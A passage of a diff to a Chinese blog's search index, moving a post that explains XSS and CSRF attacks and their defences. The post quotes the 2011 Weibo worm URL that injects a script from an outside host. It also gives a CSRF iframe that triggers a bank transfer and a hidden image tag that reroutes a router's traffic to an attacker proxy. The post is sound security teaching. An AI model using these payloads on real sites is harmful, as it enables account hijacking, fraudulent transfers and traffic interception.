-<h3 id="扩展-console-log-方法"><a href="#扩展-console-log-方法" class="headerlink" title="扩展 console.log 方法"></a>扩展 console.log 方法</h3><p>扩展 console.log 方法，每个输出前增加一个自增序号。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myLog</span> (<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    id = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        id++;</span><br><span class="line">        <span class="keyword">var</span> fn_args = [].slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">        fn_args.unshift(id+<span class="string">':'</span>);</span><br><span class="line">        fn.apply(<span class="literal">null</span>, fn_args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log = myLog(<span class="built_in">console</span>.log);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'foo'</span>);       <span class="comment">// 1: foo</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'bar'</span>);       <span class="comment">// 2: bar</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'num:'</span>, num); <span class="comment">// 3: num: 2</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>js 基础</category>
-      </categories>
-      <tags>
-        <tag>js</tag>
-        <tag>面试题</tag>
       </tags>
   </entry>
   <entry>
@@ -1336,8 +1336,86 @@
         <category>浏览器</category>
       </categories>
       <tags>
-        <tag>js</tag>
         <tag>浏览器</tag>
+        <tag>js</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xss 和 csrf 防范</title>
+    <url>/2018/11/20/xss-and-csrf/</url>
+    <content><![CDATA[<h3 id="XSS-and-CSRF"><a href="#XSS-and-CSRF" class="headerlink" title="XSS and CSRF"></a>XSS and CSRF</h3><p>来自维基百科：</p>
+<ul>
+<li><strong>CSS</strong> </li>
+</ul>
+<p>跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</p>
+<p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
+<ul>
+<li><strong>CSRF</strong></li>
+</ul>
+<p>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。[1] 跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p>
+<h4 id="XSS-攻击方法及防范"><a href="#XSS-攻击方法及防范" class="headerlink" title="XSS 攻击方法及防范"></a>XSS 攻击方法及防范</h4><p>XSS 大致可以分为两类：反射型 XSS 和储存型 XSS 。</p>
+<ul>
+<li>反射型 XSS</li>
+</ul>
+<p>被动的非持久性XSS。诱骗用户点击URL带攻击代码的链接，服务器解析后响应，在返回的响应内容中隐藏和嵌入攻击者的XSS代码，被浏览器执行，从而攻击用户。<br>URL可能被用户怀疑，但是可以通过短网址服务将之缩短，从而隐藏自己。</p>
+<ul>
+<li>储存型 XSS</li>
+</ul>
+<p>主动提交恶意数据到服务器，攻击者在数据中嵌入代码，这样当其他用户请求后，服务器从数据库中查询数据并发给用户，用户浏览此类页面时就可能受到攻击。典型的例子是留言板。</p>
+<p>还有 DOM-based XSS（基于 DOM 的 XSS），一般是攻击者通过代码注入（输入框，留言板）执行恶意代码，盗取 cookie ，获取敏感信息，进一步发起 CSRF 。</p>
+<p>防范：</p>
+<ul>
+<li>用户输入过滤。对用户提交的数据进行有效性验证，仅接受指定长度范围内并符合我们期望格式的的内容提交，阻止或者忽略除此外的其他任何数据</li>
+<li>用户输出转义，当需要将一个字符串输出到Web网页时，同时又不确定这个字符串中是否包括XSS特殊字符，为了确保输出内容的完整性和正确性，输出HTML属性时可以使用HTML转义编码（HTMLEncode）进行处理，输出到 <code>&lt;script&gt;</code> 中，可以进行JS编码。现在主流框架 Vue，React，或者衍生的 UI 框架，其实都有对输入输出做 XSS 防范。</li>
+<li>将重要的cookie标记为httponly，这样的话当浏览器向Web服务器发起请求的时就会带上cookie字段，但是在js脚本中却不能访问这个cookie，这样就避免了XSS攻击利用JavaScript的document.cookie获取cookie。【这种方法其实不是避免 XSS ，只是减小了可能的危害】</li>
+</ul>
+<p><a href="https://coolshell.cn/articles/4914.html" target="_blank" rel="noopener">2011年新浪微博的 XSS 攻击</a>是储存型 XSS 。其利用了微博广场页面 <a href="http://weibo.com/pub/star" target="_blank" rel="noopener">http://weibo.com/pub/star</a> 的一个URL注入了js脚本，其通过 <a href="http://163.fm/PxZHoxn" target="_blank" rel="noopener">http://163.fm/PxZHoxn</a> 短链接服务，将链接指向：</p>
+<p><a href="http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update" target="_blank" rel="noopener">http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update</a></p>
+<p>注意，上面URL链接中的其实就是 <code>&lt;script src=//www.2kt.cn/images/t.js&gt;&lt;/script&gt;</code>。</p>
+<p>点击这个链接的用户会自动发一条类似“郭美美事件的一些未注意到的细节 <a href="https://t.cn/amsDE”" target="_blank" rel="noopener">https://t.cn/amsDE”</a> 的微博（博文中的链接是一个新的 evil url，一旦其他用户点击，就会把类似链接传递下去）。</p>
+<h4 id="CSRF-攻击方法和防范"><a href="#CSRF-攻击方法和防范" class="headerlink" title="CSRF 攻击方法和防范"></a>CSRF 攻击方法和防范</h4><p>以下内容译自 <a href="http://www.veracode.com/security/csrf" target="_blank" rel="noopener">CROSS-SITE REQUEST FORGERY GUIDE: LEARN ALL ABOUT CSRF ATTACKS AND CSRF PROTECTION</a></p>
+<p>CSRF：恶意网站向一个 Web app 发出请求，而用户已经在别的站点认证了这个 Web 程序。用这种方法，攻击者可以通过用户信任的浏览器，访问目标 web app 的功能。被攻击的目标包括 Web app，比如社交媒体，浏览器邮件客户端，网银和网络设备的 Web 界面。</p>
+<hr>
+<h5 id="CSRF-的关键概念"><a href="#CSRF-的关键概念" class="headerlink" title="CSRF 的关键概念"></a>CSRF 的关键概念</h5><ul>
+<li>恶意请求从用户访问的站点发送到攻击者觉得经过受害者认证的其他站点。</li>
+<li>通过目标站点身份验证的恶意请求，经受害者的浏览器被发送到目标站点。</li>
+<li>漏洞存在于受影响的 Web app 中，而不是受害者的浏览器或托管CSRF的站点。</li>
+</ul>
+<hr>
+<h5 id="执行一次-CSRF-攻击"><a href="#执行一次-CSRF-攻击" class="headerlink" title="执行一次 CSRF 攻击"></a>执行一次 CSRF 攻击</h5><p>CSRF 中，攻击者利用了目标 Web app 的身份认证机制。一次 CSRF 中，受害者必须通过目标站点的身份认证（登陆）。举个例子，网银 <code>examplebank.com</code> 有 CSRF 漏洞，如果我浏览这个站点上藏有 CSRF 隐患的页面，但是我没有登录，那么无事发生。假如我登录了，攻击中的请求将被执行，看起来就好像是我做的一样。（浏览器无法辨别用户是否主动请求）。</p>
+<p>接下来讲一下，上面的攻击的细节。首先假设我在 <code>examplebank.com</code> 登陆了我的帐号，所以我可以做一些网上银行操作，包括转账。</p>
+<p>现在我碰巧访问了 <code>somemalicioussite.com</code> ，这个站点攻击 <code>examplebank.com</code> 的用户，并且在本站设置了一个 CSRF 攻击，中招的用户会向帐号 123456789 转帐 $1,500.00 。在 <code>somemalicioussite.com</code> 的某个地方，攻击者加了这样一行代码：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"//www.veracode.com/%3Ca%20href%3D"</span>http:<span class="comment">//examplebank.com/app/transferFunds?amount=1500&amp;destinationAccount=123456789"&gt;http://examplebank.com/app/transferFunds?amount=1500&amp;destinationAccount=..." &gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过加载这个 iframe ，我的浏览器会向 <code>examplebank.com</code> 发送一条转账请求，因为我已经在 <code>examplebank.com</code> 登陆了，所以请求将被执行，$1,500.00 转给了帐号 123456789 。</p>
+<hr>
+<h5 id="另一个-CSRF-例子"><a href="#另一个-CSRF-例子" class="headerlink" title="另一个 CSRF 例子"></a>另一个 CSRF 例子</h5><p>我买了一个新的家居无线路由器。同诸多 wifi 路由器，它通过一个 web 界面设置参数。我收到路由器的时候，它有一个内置 IP 地址 192.168.1.1 。我正不知如何设置路由器，刚好 <code>somemalicioussite.com</code> 上面有一个帖子有相关教程。攻击者在这个教程里面为我的路由器添加了一个代理，指向服务 123.45.67.89 ，以后通过路由器的流量都会经过这个代理，包括密码，sessionId。</p>
+<p>当我点击这个教程的时候，我忽略了一张加载失败的 1px 的小图：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=”http:<span class="comment">//192.168.1.1/admin/config/outsideInterface?nexthop=123.45.67.89” alt=”pwned” height=”1” width=”1”/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>攻击者知道我正在读他们的教程，我会登陆路由器设置界面，所以他们把 CSRF 攻击藏在教程里面。有了上面的设置，我的路由会被添加一个代理服务器，所有经过路由器的流量也会经过这个代理服务器，攻击者就可以搞坏事了。</p>
+<hr>
+<h5 id="预防-CSRF"><a href="#预防-CSRF" class="headerlink" title="预防 CSRF"></a>预防 CSRF</h5><ul>
+<li>修改请求不要使用 GET ，暴露参数</li>
+<li>img/script 标签可以跨域，能带上cookie，并且还支持除GET之外的其它方式。所以这种方式也是能实现CSRF的</li>
+</ul>
+<p>方法一是每次请求都要在参数里面显示地带上token即登陆的票，虽然跨域请求能带上cookie，但是通过document.cookie仍然是获取不到其它源的cookie的，所以攻击者无法在代码里面拿到cookie里面的token，所以就没办法了。方法一的缺点是会暴露token，所以需要带token的最好不能是GET，因为GET会把参数拼在url里面，用户可能会无意把链接发给别人，但不知道这个链接带上了自己的登陆信息。</p>
+<p>方法二是每次转账请求前都先请求一个随机串，这个串只能用一次转账或者支付请求，用完就废弃，只有这个串对得上才能请求成功，攻击者是无法拿到这个串的，因为如果跨域请求带cookie，浏览器要求Access-Control-Allow-Origin不能为通配符，只能为指定的源。</p>
+<blockquote>
+<p>参考文章</p>
+</blockquote>
+<blockquote>
+<p><a href="https://www.imooc.com/article/13553" target="_blank" rel="noopener">对于跨站脚本攻击（XSS攻击）的理解和总结</a></p>
+<p><a href="https://www.zhihu.com/question/21289758" target="_blank" rel="noopener">存储型XSS与反射型XSS有什么区别？</a></p>
+<p><a href="https://coolshell.cn/articles/4914.html" target="_blank" rel="noopener">新浪微博的XSS攻击</a></p>
+<p><a href="http://www.veracode.com/security/csrf" target="_blank" rel="noopener">CROSS-SITE REQUEST FORGERY GUIDE: LEARN ALL ABOUT CSRF ATTACKS AND CSRF PROTECTION</a></p>
+<p><a href="https://fed.renren.com/2018/01/20/cross-origin/" target="_blank" rel="noopener">我知道的跨域与安全</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>网络</category>
+      </categories>
+      <tags>
+        <tag>网络</tag>
+        <tag>安全</tag>
       </tags>
   </entry>
   <entry>
@@ -1473,84 +1551,6 @@
       </categories>
       <tags>
         <tag>网络</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xss 和 csrf 防范</title>
-    <url>/2018/11/20/xss-and-csrf/</url>
-    <content><![CDATA[<h3 id="XSS-and-CSRF"><a href="#XSS-and-CSRF" class="headerlink" title="XSS and CSRF"></a>XSS and CSRF</h3><p>来自维基百科：</p>
-<ul>
-<li><strong>CSS</strong> </li>
-</ul>
-<p>跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</p>
-<p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
-<ul>
-<li><strong>CSRF</strong></li>
-</ul>
-<p>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。[1] 跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p>
-<h4 id="XSS-攻击方法及防范"><a href="#XSS-攻击方法及防范" class="headerlink" title="XSS 攻击方法及防范"></a>XSS 攻击方法及防范</h4><p>XSS 大致可以分为两类：反射型 XSS 和储存型 XSS 。</p>
-<ul>
-<li>反射型 XSS</li>
-</ul>
-<p>被动的非持久性XSS。诱骗用户点击URL带攻击代码的链接，服务器解析后响应，在返回的响应内容中隐藏和嵌入攻击者的XSS代码，被浏览器执行，从而攻击用户。<br>URL可能被用户怀疑，但是可以通过短网址服务将之缩短，从而隐藏自己。</p>
-<ul>
-<li>储存型 XSS</li>
-</ul>
-<p>主动提交恶意数据到服务器，攻击者在数据中嵌入代码，这样当其他用户请求后，服务器从数据库中查询数据并发给用户，用户浏览此类页面时就可能受到攻击。典型的例子是留言板。</p>
-<p>还有 DOM-based XSS（基于 DOM 的 XSS），一般是攻击者通过代码注入（输入框，留言板）执行恶意代码，盗取 cookie ，获取敏感信息，进一步发起 CSRF 。</p>
-<p>防范：</p>
-<ul>
-<li>用户输入过滤。对用户提交的数据进行有效性验证，仅接受指定长度范围内并符合我们期望格式的的内容提交，阻止或者忽略除此外的其他任何数据</li>
-<li>用户输出转义，当需要将一个字符串输出到Web网页时，同时又不确定这个字符串中是否包括XSS特殊字符，为了确保输出内容的完整性和正确性，输出HTML属性时可以使用HTML转义编码（HTMLEncode）进行处理，输出到 <code>&lt;script&gt;</code> 中，可以进行JS编码。现在主流框架 Vue，React，或者衍生的 UI 框架，其实都有对输入输出做 XSS 防范。</li>
-<li>将重要的cookie标记为httponly，这样的话当浏览器向Web服务器发起请求的时就会带上cookie字段，但是在js脚本中却不能访问这个cookie，这样就避免了XSS攻击利用JavaScript的document.cookie获取cookie。【这种方法其实不是避免 XSS ，只是减小了可能的危害】</li>
-</ul>
-<p><a href="https://coolshell.cn/articles/4914.html" target="_blank" rel="noopener">2011年新浪微博的 XSS 攻击</a>是储存型 XSS 。其利用了微博广场页面 <a href="http://weibo.com/pub/star" target="_blank" rel="noopener">http://weibo.com/pub/star</a> 的一个URL注入了js脚本，其通过 <a href="http://163.fm/PxZHoxn" target="_blank" rel="noopener">http://163.fm/PxZHoxn</a> 短链接服务，将链接指向：</p>
-<p><a href="http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update" target="_blank" rel="noopener">http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update</a></p>
-<p>注意，上面URL链接中的其实就是 <code>&lt;script src=//www.2kt.cn/images/t.js&gt;&lt;/script&gt;</code>。</p>
-<p>点击这个链接的用户会自动发一条类似“郭美美事件的一些未注意到的细节 <a href="https://t.cn/amsDE”" target="_blank" rel="noopener">https://t.cn/amsDE”</a> 的微博（博文中的链接是一个新的 evil url，一旦其他用户点击，就会把类似链接传递下去）。</p>
-<h4 id="CSRF-攻击方法和防范"><a href="#CSRF-攻击方法和防范" class="headerlink" title="CSRF 攻击方法和防范"></a>CSRF 攻击方法和防范</h4><p>以下内容译自 <a href="http://www.veracode.com/security/csrf" target="_blank" rel="noopener">CROSS-SITE REQUEST FORGERY GUIDE: LEARN ALL ABOUT CSRF ATTACKS AND CSRF PROTECTION</a></p>
-<p>CSRF：恶意网站向一个 Web app 发出请求，而用户已经在别的站点认证了这个 Web 程序。用这种方法，攻击者可以通过用户信任的浏览器，访问目标 web app 的功能。被攻击的目标包括 Web app，比如社交媒体，浏览器邮件客户端，网银和网络设备的 Web 界面。</p>
-<hr>
-<h5 id="CSRF-的关键概念"><a href="#CSRF-的关键概念" class="headerlink" title="CSRF 的关键概念"></a>CSRF 的关键概念</h5><ul>
-<li>恶意请求从用户访问的站点发送到攻击者觉得经过受害者认证的其他站点。</li>
-<li>通过目标站点身份验证的恶意请求，经受害者的浏览器被发送到目标站点。</li>
-<li>漏洞存在于受影响的 Web app 中，而不是受害者的浏览器或托管CSRF的站点。</li>
-</ul>
-<hr>
-<h5 id="执行一次-CSRF-攻击"><a href="#执行一次-CSRF-攻击" class="headerlink" title="执行一次 CSRF 攻击"></a>执行一次 CSRF 攻击</h5><p>CSRF 中，攻击者利用了目标 Web app 的身份认证机制。一次 CSRF 中，受害者必须通过目标站点的身份认证（登陆）。举个例子，网银 <code>examplebank.com</code> 有 CSRF 漏洞，如果我浏览这个站点上藏有 CSRF 隐患的页面，但是我没有登录，那么无事发生。假如我登录了，攻击中的请求将被执行，看起来就好像是我做的一样。（浏览器无法辨别用户是否主动请求）。</p>
-<p>接下来讲一下，上面的攻击的细节。首先假设我在 <code>examplebank.com</code> 登陆了我的帐号，所以我可以做一些网上银行操作，包括转账。</p>
-<p>现在我碰巧访问了 <code>somemalicioussite.com</code> ，这个站点攻击 <code>examplebank.com</code> 的用户，并且在本站设置了一个 CSRF 攻击，中招的用户会向帐号 123456789 转帐 $1,500.00 。在 <code>somemalicioussite.com</code> 的某个地方，攻击者加了这样一行代码：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"//www.veracode.com/%3Ca%20href%3D"</span>http:<span class="comment">//examplebank.com/app/transferFunds?amount=1500&amp;destinationAccount=123456789"&gt;http://examplebank.com/app/transferFunds?amount=1500&amp;destinationAccount=..." &gt;</span></span><br></pre></td></tr></table></figure>
-<p>通过加载这个 iframe ，我的浏览器会向 <code>examplebank.com</code> 发送一条转账请求，因为我已经在 <code>examplebank.com</code> 登陆了，所以请求将被执行，$1,500.00 转给了帐号 123456789 。</p>
-<hr>
-<h5 id="另一个-CSRF-例子"><a href="#另一个-CSRF-例子" class="headerlink" title="另一个 CSRF 例子"></a>另一个 CSRF 例子</h5><p>我买了一个新的家居无线路由器。同诸多 wifi 路由器，它通过一个 web 界面设置参数。我收到路由器的时候，它有一个内置 IP 地址 192.168.1.1 。我正不知如何设置路由器，刚好 <code>somemalicioussite.com</code> 上面有一个帖子有相关教程。攻击者在这个教程里面为我的路由器添加了一个代理，指向服务 123.45.67.89 ，以后通过路由器的流量都会经过这个代理，包括密码，sessionId。</p>
-<p>当我点击这个教程的时候，我忽略了一张加载失败的 1px 的小图：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=”http:<span class="comment">//192.168.1.1/admin/config/outsideInterface?nexthop=123.45.67.89” alt=”pwned” height=”1” width=”1”/&gt;</span></span><br></pre></td></tr></table></figure>
-<p>攻击者知道我正在读他们的教程，我会登陆路由器设置界面，所以他们把 CSRF 攻击藏在教程里面。有了上面的设置，我的路由会被添加一个代理服务器，所有经过路由器的流量也会经过这个代理服务器，攻击者就可以搞坏事了。</p>
-<hr>
-<h5 id="预防-CSRF"><a href="#预防-CSRF" class="headerlink" title="预防 CSRF"></a>预防 CSRF</h5><ul>
-<li>修改请求不要使用 GET ，暴露参数</li>
-<li>img/script 标签可以跨域，能带上cookie，并且还支持除GET之外的其它方式。所以这种方式也是能实现CSRF的</li>
-</ul>
-<p>方法一是每次请求都要在参数里面显示地带上token即登陆的票，虽然跨域请求能带上cookie，但是通过document.cookie仍然是获取不到其它源的cookie的，所以攻击者无法在代码里面拿到cookie里面的token，所以就没办法了。方法一的缺点是会暴露token，所以需要带token的最好不能是GET，因为GET会把参数拼在url里面，用户可能会无意把链接发给别人，但不知道这个链接带上了自己的登陆信息。</p>
-<p>方法二是每次转账请求前都先请求一个随机串，这个串只能用一次转账或者支付请求，用完就废弃，只有这个串对得上才能请求成功，攻击者是无法拿到这个串的，因为如果跨域请求带cookie，浏览器要求Access-Control-Allow-Origin不能为通配符，只能为指定的源。</p>
-<blockquote>
-<p>参考文章</p>
-</blockquote>
-<blockquote>
-<p><a href="https://www.imooc.com/article/13553" target="_blank" rel="noopener">对于跨站脚本攻击（XSS攻击）的理解和总结</a></p>
-<p><a href="https://www.zhihu.com/question/21289758" target="_blank" rel="noopener">存储型XSS与反射型XSS有什么区别？</a></p>
-<p><a href="https://coolshell.cn/articles/4914.html" target="_blank" rel="noopener">新浪微博的XSS攻击</a></p>
-<p><a href="http://www.veracode.com/security/csrf" target="_blank" rel="noopener">CROSS-SITE REQUEST FORGERY GUIDE: LEARN ALL ABOUT CSRF ATTACKS AND CSRF PROTECTION</a></p>
-<p><a href="https://fed.renren.com/2018/01/20/cross-origin/" target="_blank" rel="noopener">我知道的跨域与安全</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>网络</category>
-      </categories>
-      <tags>
-        <tag>网络</tag>
-        <tag>安全</tag>
       </tags>
   </entry>
 </search>
